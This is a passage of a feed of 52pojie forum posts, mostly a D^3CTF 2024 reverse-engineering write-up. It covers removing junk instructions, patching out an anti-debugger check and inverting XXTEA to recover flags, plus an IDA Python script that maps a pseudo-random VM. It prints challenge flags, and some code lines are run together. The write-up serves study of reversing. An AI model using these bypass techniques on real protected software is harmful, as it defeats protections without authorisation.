rgb(255, 0, 0);">~</span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.bilibili.com/video/BV1tC411j7yL/">阅读原文</a></p>
]]></content:encoded>
<pubDate>Wed, 08 May 2024 17:01:30 +0800</pubDate>
</item>
<item>
<title>（图作者 | @Aoemax）</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140630&amp;idx=1&amp;sn=c0c51ea5439089de60f811c97a97dcba&amp;chksm=bd50a2428a272b5405e7bc563eeca7e6bc2a96237fe9af8e7240650ad672744c0d4dfecb2602&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140630&amp;idx=1&amp;sn=c0c51ea5439089de60f811c97a97dcba&amp;chksm=bd50a2428a272b5405e7bc563eeca7e6bc2a96237fe9af8e7240650ad672744c0d4dfecb2602&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<div> 1. 吾爱破解网站将于2024年5月1日在北京举办活动。<br />
2. 活动将于当天的上午8点20分开始。<br />
3. 位置在北京，具体地点将在后续公布。<br /> <div>
<p>
<span>吾爱pojie</span> <span>2024-05-01 08:20</span> <span style="display: inline-block;">北京</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=f7066477&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZIKKHyC3gctqVFxbsH96wdhCfoPV982QJSicCHzByphicblEfS3ynxToVmc6qSUyaPSg5XQONKtGaWg%2F0%3Fwx_fmt%3Djpeg" />
</p>

<div class="image_content " id="js_image_content"> <!----> <!----> <div class="wx_album_area js_album_wrap "></div> <div class="rich_media_tool "><div class="rich_media_info weui-flex policy_tips js_ad_policy_tips tips_global_primary "><!----></div></div> </div>

<p><img src="https://mmbiz.qpic.cn/sz_mmbiz_jpg/LFPriaSjBUZIKKHyC3gctqVFxbsH96wdhFRURLuguERrLTqhGqefVTyMGlgcSsbxyRwWNDvpvKS00g6hRF4vDyw/0?wx_fmt=jpeg" /></p>
]]></content:encoded>
<pubDate>Tue, 30 Apr 2024 10:26:37 +0800</pubDate>
</item>
<item>
<title>D^3CTF2024逆向Writeup</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140629&amp;idx=1&amp;sn=d318c6e30cf42b6c36035fa46099d20b&amp;chksm=bd50a2418a272b57ca1b971a70b22d46970027a544edccdec2c24cf92d289173ad60ac420a40&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140629&amp;idx=1&amp;sn=d318c6e30cf42b6c36035fa46099d20b&amp;chksm=bd50a2418a272b57ca1b971a70b22d46970027a544edccdec2c24cf92d289173ad60ac420a40&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-04-29 15:16</span> <span style="display: inline-block;">北京</span>
</p>

<p>逆向部分题目很不错，VM题的伪随机控制流和迷宫题异常处理设置很巧妙，还剩两道没力气逆了，以后再补。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=4ece5f74&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZIKKHyC3gctqVFxbsH96wdh6kLhjVuZLmTtbMgl3VFrUzummS7D6jYEXNNtVzDZVC5J2dFicRF8EsA%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="line-height: normal; margin-bottom: 0px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：zipkey</span></strong></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><h2>写在前面</h2><p>第一次在52发帖，写的有问题的地方还请师傅们见谅</p><p>逆向部分题目很不错，VM题的伪随机控制流和迷宫题异常处理设置很巧妙，还剩两道没力气逆了，以后再补</p><h2>ezjunk</h2><p>花指令，直接NOP掉，反编译main函数</p><p><img border="0" class="rich_pages wxw-img" height="414" src="https://wechat2rss.xlab.app/img-proxy/?k=8023eb9a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKKHyC3gctqVFxbsH96wdh3nan6iajo4kKqVXwTrevcobBNsSUruJPW3wQ4oWNxYPWaRya9VmuyLw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="796" /></p><p><br /></p><p><img border="0" class="rich_pages wxw-img" height="436" src="https://wechat2rss.xlab.app/img-proxy/?k=541eaf60&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKKHyC3gctqVFxbsH96wdhX7AGzOFx5chez0fFP4UkAGMZiaV50EoTia0PuwFPfVcuhCibtGOpAENbQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>加密部分是xxtea，观察调用时传入的参数，a2是sum，来自<code style="font-family: SFMono-Regular, Consolas, ;">loc_4015C3+2</code>，a3是delta，来自<code style="font-family: SFMono-Regular, Consolas, ;">loc_401A1C</code>，a4是key,来自<code style="font-family: SFMono-Regular, Consolas, ;">off_404350 + 400</code></p><p>delta在main里面，刚好是patch掉的部分，需要记录patch前的数据，sum在另一个函数里面，先去掉花指令</p><p><img border="0" height="390" src="https://wechat2rss.xlab.app/img-proxy/?k=15202a1b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKKHyC3gctqVFxbsH96wdhnEoKnUhGkHP1h1VymX4KZyM64VLUKkaxj0pFo32ibwFaolt4CBrSISw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="788" /></p><p><br /></p><p>找到sum所在的地方，这部分在main运行前执行，LoadLibraryA没用，可以忽略，IsDebuggerPresent检测调试器，根据是否被调试设置key，patch掉反调试，记录patch前的sum值</p><p>写xxtea解密</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">#!/usr/bin/env python</span><br />flag = [<span style="color: rgb(255, 115, 253);">0x5406CBB1</span>, <span style="color: rgb(255, 115, 253);">0xA4A41EA2</span>, <span style="color: rgb(255, 115, 253);">0x34489AC5</span>, <span style="color: rgb(255, 115, 253);">0x53D68797</span>, <span style="color: rgb(255, 115, 253);">0xB8E0C06F</span>, <span style="color: rgb(255, 115, 253);">0x259F2DB</span>, <span style="color: rgb(255, 115, 253);">0x52E38D82</span>, <span style="color: rgb(255, 115, 253);">0x595D5E1D</span>]<br />k2 = <span style="color: rgb(255, 115, 253);">0xE8017300</span><br />k3 = <span style="color: rgb(255, 115, 253);">0xFF58F981</span><br />key = [<span style="color: rgb(255, 115, 253);">0x5454</span>, <span style="color: rgb(255, 115, 253);">0x4602</span>, <span style="color: rgb(255, 115, 253);">0x4477</span>, <span style="color: rgb(255, 115, 253);">0x5E5E</span>, <span style="color: rgb(255, 115, 253);">0x33</span>, <span style="color: rgb(255, 115, 253);">0x43</span>, <span style="color: rgb(255, 115, 253);">0x54</span>, <span style="color: rgb(255, 115, 253);">0x46</span>]<br /><span style="color: rgb(150, 203, 254);">for</span> i <span style="color: rgb(150, 203, 254);">in</span> range(<span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(255, 115, 253);">7</span>, <span style="color: rgb(255, 115, 253);">2</span>):<br />    v6 = flag[i+<span style="color: rgb(255, 115, 253);">1</span>]    v7 = flag[i]    a2 = k2<br />    <span style="color: rgb(150, 203, 254);">for</span> _ <span style="color: rgb(150, 203, 254);">in</span> range(<span style="color: rgb(255, 115, 253);">32</span>)<br />        a2 = a2 + <span style="color: rgb(255, 115, 253);">0x100000000</span> - k3<br />        a2 &amp;= <span style="color: rgb(255, 115, 253);">0xFFFFFFFF</span><br />    <span style="color: rgb(150, 203, 254);">for</span> _ <span style="color: rgb(150, 203, 254);">in</span> range(<span style="color: rgb(255, 115, 253);">32</span>):        a2 += k3<br />        a2 &amp;= <span style="color: rgb(255, 115, 253);">0xFFFFFFFF</span><br />        v6 = v6 + <span style="color: rgb(255, 115, 253);">0x100000000</span> - (((v7 + ((v7 &lt;&lt; <span style="color: rgb(255, 115, 253);">5</span>) ^ (v7 &gt;&gt; <span style="color: rgb(255, 115, 253);">6</span>))) ^ (key[(a2&gt;&gt;<span style="color: rgb(255, 115, 253);">11</span>)&amp;<span style="color: rgb(255, 115, 253);">3</span>]+a2) ^ <span style="color: rgb(255, 115, 253);">0x33</span>) &amp; <span style="color: rgb(255, 115, 253);">0xFFFFFFFF</span>)<br />        v6 &amp;= <span style="color: rgb(255, 115, 253);">0xFFFFFFFF</span><br />        v7 = v7 + <span style="color: rgb(255, 115, 253);">0x100000000</span> - (((v6 + ((v6 &lt;&lt; <span style="color: rgb(255, 115, 253);">4</span>) ^ (v6 &gt;&gt; <span style="color: rgb(255, 115, 253);">5</span>))) ^ (key[a2&amp;<span style="color: rgb(255, 115, 253);">3</span>]+a2) ^ <span style="color: rgb(255, 115, 253);">0x44</span>) &amp; <span style="color: rgb(255, 115, 253);">0xFFFFFFFF</span>)<br />        v7 &amp;= <span style="color: rgb(255, 115, 253);">0xFFFFFFFF</span><br />    flag[i+<span style="color: rgb(255, 115, 253);">1</span>] = v6    flag[i] = v7    print(hex(v7), hex(v6))<br /><span style="color: rgb(150, 203, 254);">for</span> f <span style="color: rgb(150, 203, 254);">in</span> flag:<br />    print(f.to_bytes(<span style="color: rgb(255, 115, 253);">4</span>, <span style="color: rgb(168, 255, 96);">"little"</span>).decode(), end=<span style="color: rgb(168, 255, 96);">''</span>)<br /><span style="color: rgb(146, 255, 184);"># fakeflag{Is_there_anywhere_else}</span></code></pre><p>跑出来发现是假flag<code style="font-family: SFMono-Regular, Consolas, ;">fakeflag{Is_there_anywhere_else}</code>，main里面是假校验，</p><p>分析发现注册了一个退出时调用的函数<code style="font-family: SFMono-Regular, Consolas, ;">sub_4016BC</code>，NOP去混淆反编译</p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=bef6398c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKKHyC3gctqVFxbsH96wdhBtqBZlr08dUHgdtZZ1Wc2lJZYtfLicX6gZwOdGfoia3dZ5R0ydXqTFibg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="865" /></p><p><br /></p><p>这里才是真check，对xxtea加密后的flag移位异或，再跟真ans校验</p><p>移位的时候根据最高为决定移位后是否异或<code style="font-family: SFMono-Regular, Consolas, ;">0x84A6972F</code>，逆向看的时候注意最低位，异或<code style="font-family: SFMono-Regular, Consolas, ;">0x84A6972F</code>后最低位为1，否则为0，所以解密根据最低位判断是否异或<code style="font-family: SFMono-Regular, Consolas, ;">0x84A6972F</code></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">flag = [<span style="color: rgb(255, 115, 253);">0xB6DDB3A9</span>, <span style="color: rgb(255, 115, 253);">0x36162C23</span>, <span style="color: rgb(255, 115, 253);">0x1889FABF</span>, <span style="color: rgb(255, 115, 253);">0x6CE4E73B</span>, <span style="color: rgb(255, 115, 253);">0xA5AF8FC</span>, <span style="color: rgb(255, 115, 253);">0x21FF8415</span>, <span style="color: rgb(255, 115, 253);">0x44859557</span>, <span style="color: rgb(255, 115, 253);">0x2DC227B7</span>]<br /><span style="color: rgb(150, 203, 254);">for</span> i <span style="color: rgb(150, 203, 254);">in</span> range(<span style="color: rgb(255, 115, 253);">8</span>):<br />    <span style="color: rgb(150, 203, 254);">for</span> _ <span style="color: rgb(150, 203, 254);">in</span> range(<span style="color: rgb(255, 115, 253);">32</span>):        v0 = flag[i]<br />        <span style="color: rgb(150, 203, 254);">if</span> ((v0 &amp; <span style="color: rgb(255, 115, 253);">1</span>) == <span style="color: rgb(255, 115, 253);">1</span>):<br />            v0 ^= <span style="color: rgb(255, 115, 253);">0x84A6972F</span><br />            v0 = v0 &gt;&gt; <span style="color: rgb(255, 115, 253);">1</span><br />            v0 |= <span style="color: rgb(255, 115, 253);">0x80000000</span><br />        <span style="color: rgb(150, 203, 254);">else</span>:<br />            v0 = v0 &gt;&gt; <span style="color: rgb(255, 115, 253);">1</span><br />        flag[i] = v0</code></pre><p>继续xxtea解密得到真flag<code style="font-family: SFMono-Regular, Consolas, ;">d3ctf{ea3yjunk_c0d3_4nd_ea5y_re}</code></p><h2>RandomVm</h2><p>srand设置随机数种子<code style="font-family: SFMono-Regular, Consolas, ;">0xD33B470</code>，假随机，可以直接把rand跑出来</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=5d3a1a8a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKKHyC3gctqVFxbsH96wdh8rGVyass9LyvRv1yyfl6wP8Zqfo8YibNlNW7sb9WEo11huC9722TUHg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="975" /></p><p><br /></p><p>大量函数都是上面的结构，先进行一段操作，再设置跳转表，rand一个随机数选择下一个执行的函数</p><p>每个函数对应一条虚拟机指令，控制流由跳转表和rand控制，需要分析每个函数的功能与跳转关系，100+函数手动分析是不可能的，用IDA Python解析一下</p><p>从入口开始解析，通过解析汇编指令获取跳转表，同时记录每个函数反编译的虚拟机指令</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">import</span> idc<br /><span style="color: rgb(150, 203, 254);">import</span> idaapi<br />start = <span style="color: rgb(255, 115, 253);">0x717F</span>funcs = {}<br /><span style="color: rgb(146, 255, 184);"># 递归找函数关系</span><br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">recur</span>(addr):    print(hex(addr))<br />    <span style="color: rgb(150, 203, 254);">if</span> (addr == <span style="color: rgb(255, 115, 253);">0x241A</span>):<br />        <span style="color: rgb(150, 203, 254);">return</span>    ea = addr    value_dic = {}<br />    <span style="color: rgb(150, 203, 254);">while</span> (<span style="color: rgb(198, 197, 254);">True</span>):<br />        ins = idc.generate_disasm_line(ea, <span style="color: rgb(255, 115, 253);">0</span>)<br />        <span style="color: rgb(150, 203, 254);">if</span> (ins.startswith(<span style="color: rgb(168, 255, 96);">"mov"</span>)):<br />            op0 = idc.print_operand(ea, <span style="color: rgb(255, 115, 253);">0</span>)<br />            op1 = idc.print_operand(ea, <span style="color: rgb(255, 115, 253);">1</span>)<br />            <span style="color: rgb(146, 255, 184);"># 过滤eax rax</span><br />            <span style="color: rgb(150, 203, 254);">if</span> (op0[<span style="color: rgb(255, 115, 253);">0</span>] <span style="color: rgb(150, 203, 254);">in</span> <span style="color: rgb(168, 255, 96);">"er"</span>):<br />                op0 = op0[<span style="color: rgb(255, 115, 253);">1</span>:]<br />            <span style="color: rgb(150, 203, 254);">if</span> (op1[<span style="color: rgb(255, 115, 253);">0</span>] <span style="color: rgb(150, 203, 254);">in</span> <span style="color: rgb(168, 255, 96);">"er"</span>):<br />                op1 = op1[<span style="color: rgb(255, 115, 253);">1</span>:]            value_dic[op0] = op1            value_dic[op0] = op1<br />            <span style="color: rgb(150, 203, 254);">if</span> (op0.startswith(<span style="color: rgb(168, 255, 96);">"[rbp+var_"</span>)):<br />                <span style="color: rgb(150, 203, 254);">if</span> (op1[-<span style="color: rgb(255, 115, 253);">1</span>] != <span style="color: rgb(168, 255, 96);">'h'</span>):                    value_dic[op0] = value_dic[op1]<br />        <span style="color: rgb(146, 255, 184);"># print(hex(ea), ins)</span><br />        <span style="color: rgb(150, 203, 254);">if</span> (ins == <span style="color: rgb(168, 255, 96);">"call    _rand"</span> <span style="color: rgb(150, 203, 254);">and</span> len(value_dic) &gt;= <span style="color: rgb(255, 115, 253);">10</span>):<br />            <span style="color: rgb(150, 203, 254);">break</span>        ins_len = idc.create_insn(ea)        ea += ins_len<br />    <span style="color: rgb(146, 255, 184);"># xor</span>    print(value_dic)<br />    xor_ins = idc.print_operand(ea+<span style="color: rgb(255, 115, 253);">0x36</span>, <span style="color: rgb(255, 115, 253);">1</span>)[:-<span style="color: rgb(255, 115, 253);">1</span>]<br />    xor = int(xor_ins, <span style="color: rgb(255, 115, 253);">16</span>)    nexts = []<br />    <span style="color: rgb(150, 203, 254);">for</span> i <span style="color: rgb(150, 203, 254);">in</span> [<span style="color: rgb(168, 255, 96);">"60"</span>, <span style="color: rgb(168, 255, 96);">"58"</span>, <span style="color: rgb(168, 255, 96);">"50"</span>, <span style="color: rgb(168, 255, 96);">"48"</span>, <span style="color: rgb(168, 255, 96);">"40"</span>, <span style="color: rgb(168, 255, 96);">"38"</span>, <span style="color: rgb(168, 255, 96);">"30"</span>, <span style="color: rgb(168, 255, 96);">"28"</span>, <span style="color: rgb(168, 255, 96);">"20"</span>, <span style="color: rgb(168, 255, 96);">"18"</span>]:<br />        next = int(value_dic[<span style="color: rgb(168, 255, 96);">f"[rbp+var_<span style="color: rgb(218, 239, 163);">{i}</span>]"</span>][:-<span style="color: rgb(255, 115, 253);">1</span>], <span style="color: rgb(255, 115, 253);">16</span>)<br />        next = ((next ^ xor) + addr) &amp; <span style="color: rgb(255, 115, 253);">0xFFFFFFFFFFFFFFFF</span>        nexts.append(next)    funcs[addr] = nexts<br />    <span style="color: rgb(150, 203, 254);">for</span> next <span style="color: rgb(150, 203, 254);">in</span> nexts:<br />        <span style="color: rgb(150, 203, 254);">if</span> (next <span style="color: rgb(150, 203, 254);">not</span> <span style="color: rgb(150, 203, 254);">in</span> funcs):            recur(next)ea = start<br />idc.set_name(ea, <span style="color: rgb(168, 255, 96);">"main_main"</span>)recur(ea)print(funcs)<br /><span style="color: rgb(150, 203, 254);">for</span> ea <span style="color: rgb(150, 203, 254);">in</span> funcs:<br />    src = str(idaapi.decompile(ea)).split(<span style="color: rgb(168, 255, 96);">'\n'</span>)<br />    print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{hex(ea)}</span>: \"<span style="color: rgb(218, 239, 163);">{src[<span style="color: rgb(255, 115, 253);">5</span>]}</span>\","</span>)</code></pre><p>分析后得到所有函数的关系，以及每个函数对应的虚拟机指令，手动优化一下</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">ops = {<br /><span style="color: rgb(255, 115, 253);">0x717f</span>: ([<span style="color: rgb(255, 115, 253);">0x6bc8</span>, <span style="color: rgb(255, 115, 253);">0x340a</span>, <span style="color: rgb(255, 115, 253);">0x2917</span>, <span style="color: rgb(255, 115, 253);">0x2db3</span>, <span style="color: rgb(255, 115, 253);">0x6233</span>, <span style="color: rgb(255, 115, 253);">0x4f23</span>, <span style="color: rgb(255, 115, 253);">0x16f8</span>, <span style="color: rgb(255, 115, 253);">0x1e22</span>, <span style="color: rgb(255, 115, 253);">0x2f84</span>, <span style="color: rgb(255, 115, 253);">0x2db3</span>], <span style="color: rgb(168, 255, 96);">"  array[r0] = 0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x6bc8</span>: ([<span style="color: rgb(255, 115, 253);">0x55a9</span>, <span style="color: rgb(255, 115, 253);">0x604e</span>, <span style="color: rgb(255, 115, 253);">0x3725</span>, <span style="color: rgb(255, 115, 253);">0x2917</span>, <span style="color: rgb(255, 115, 253);">0x1fb5</span>, <span style="color: rgb(255, 115, 253);">0x2425</span>, <span style="color: rgb(255, 115, 253);">0x6d19</span>, <span style="color: rgb(255, 115, 253);">0x7095</span>, <span style="color: rgb(255, 115, 253);">0x16f8</span>, <span style="color: rgb(255, 115, 253);">0x26a4</span>], <span style="color: rgb(168, 255, 96);">"  *((_BYTE *)&amp;flag + (unsigned __int8)r1) = ((int)*((unsigned __int8 *)&amp;flag + (unsigned __int8)r1) &gt;&gt; array[r0]) | (*((_BYTE *)&amp;flag + (unsigned __int8)r1) &lt;&lt; (8 - array[r0]));"</span>),<br /><span style="color: rgb(255, 115, 253);">0x55a9</span>: ([<span style="color: rgb(255, 115, 253);">0x5c94</span>, <span style="color: rgb(255, 115, 253);">0x62f3</span>, <span style="color: rgb(255, 115, 253);">0x3d82</span>, <span style="color: rgb(255, 115, 253);">0x3d82</span>, <span style="color: rgb(255, 115, 253);">0x40cb</span>, <span style="color: rgb(255, 115, 253);">0x3959</span>, <span style="color: rgb(255, 115, 253);">0x5676</span>, <span style="color: rgb(255, 115, 253);">0x40cb</span>, <span style="color: rgb(255, 115, 253);">0x3f0e</span>, <span style="color: rgb(255, 115, 253);">0x6154</span>], <span style="color: rgb(168, 255, 96);">"  array[r0] = 0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x5c94</span>: ([<span style="color: rgb(255, 115, 253);">0x1cd0</span>, <span style="color: rgb(255, 115, 253);">0x3308</span>, <span style="color: rgb(255, 115, 253);">0x1a4c</span>, <span style="color: rgb(255, 115, 253);">0x1e22</span>, <span style="color: rgb(255, 115, 253);">0x1cd0</span>, <span style="color: rgb(255, 115, 253);">0x16f8</span>, <span style="color: rgb(255, 115, 253);">0x16f8</span>, <span style="color: rgb(255, 115, 253);">0x1a4c</span>, <span style="color: rgb(255, 115, 253);">0x1a4c</span>, <span style="color: rgb(255, 115, 253);">0x44aa</span>], <span style="color: rgb(168, 255, 96);">"  --r0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x1cd0</span>: ([<span style="color: rgb(255, 115, 253);">0x3f0e</span>, <span style="color: rgb(255, 115, 253);">0x41aa</span>, <span style="color: rgb(255, 115, 253);">0x66a4</span>, <span style="color: rgb(255, 115, 253);">0x3a4b</span>, <span style="color: rgb(255, 115, 253);">0x481b</span>, <span style="color: rgb(255, 115, 253);">0x7375</span>, <span style="color: rgb(255, 115, 253);">0x7375</span>, <span style="color: rgb(255, 115, 253);">0x2cd4</span>, <span style="color: rgb(255, 115, 253);">0x51ff</span>, <span style="color: rgb(255, 115, 253);">0x5f5c</span>], <span style="color: rgb(168, 255, 96);">"  array[r0] = syscall((char)array[r0], (unsigned int)(char)array[r0 + 1], &amp;array[r0 + 2], (unsigned int)(char)array[r0 + 3]);"</span>),<br /><span style="color: rgb(255, 115, 253);">0x3f0e</span>: ([<span style="color: rgb(255, 115, 253);">0x2917</span>, <span style="color: rgb(255, 115, 253);">0x2917</span>, <span style="color: rgb(255, 115, 253);">0x3bf0</span>, <span style="color: rgb(255, 115, 253);">0x5676</span>, <span style="color: rgb(255, 115, 253);">0x55a9</span>, <span style="color: rgb(255, 115, 253);">0x5676</span>, <span style="color: rgb(255, 115, 253);">0x3bf0</span>, <span style="color: rgb(255, 115, 253);">0x3f0e</span>, <span style="color: rgb(255, 115, 253);">0x3959</span>, <span style="color: rgb(255, 115, 253);">0x3f0e</span>], <span style="color: rgb(168, 255, 96);">"  ++r0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x2917</span>: ([<span style="color: rgb(255, 115, 253);">0x340a</span>, <span style="color: rgb(255, 115, 253);">0x43c2</span>, <span style="color: rgb(255, 115, 253);">0x3e48</span>, <span style="color: rgb(255, 115, 253);">0x24db</span>, <span style="color: rgb(255, 115, 253);">0x24db</span>, <span style="color: rgb(255, 115, 253);">0x1ee8</span>, <span style="color: rgb(255, 115, 253);">0x55a9</span>, <span style="color: rgb(255, 115, 253);">0x5002</span>, <span style="color: rgb(255, 115, 253);">0x2425</span>, <span style="color: rgb(255, 115, 253);">0x2771</span>], <span style="color: rgb(168, 255, 96);">"  *((_BYTE *)&amp;flag + (unsigned __int8)r1) ^= array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x340a</span>: ([<span style="color: rgb(255, 115, 253);">0x3f0e</span>, <span style="color: rgb(255, 115, 253);">0x25b1</span>, <span style="color: rgb(255, 115, 253);">0x42fc</span>, <span style="color: rgb(255, 115, 253);">0x51ff</span>, <span style="color: rgb(255, 115, 253);">0x3f0e</span>, <span style="color: rgb(255, 115, 253);">0x5676</span>, <span style="color: rgb(255, 115, 253);">0x64d3</span>, <span style="color: rgb(255, 115, 253);">0x3058</span>, <span style="color: rgb(255, 115, 253);">0x3f0e</span>, <span style="color: rgb(255, 115, 253);">0x3959</span>], <span style="color: rgb(168, 255, 96);">"  array[r0] = 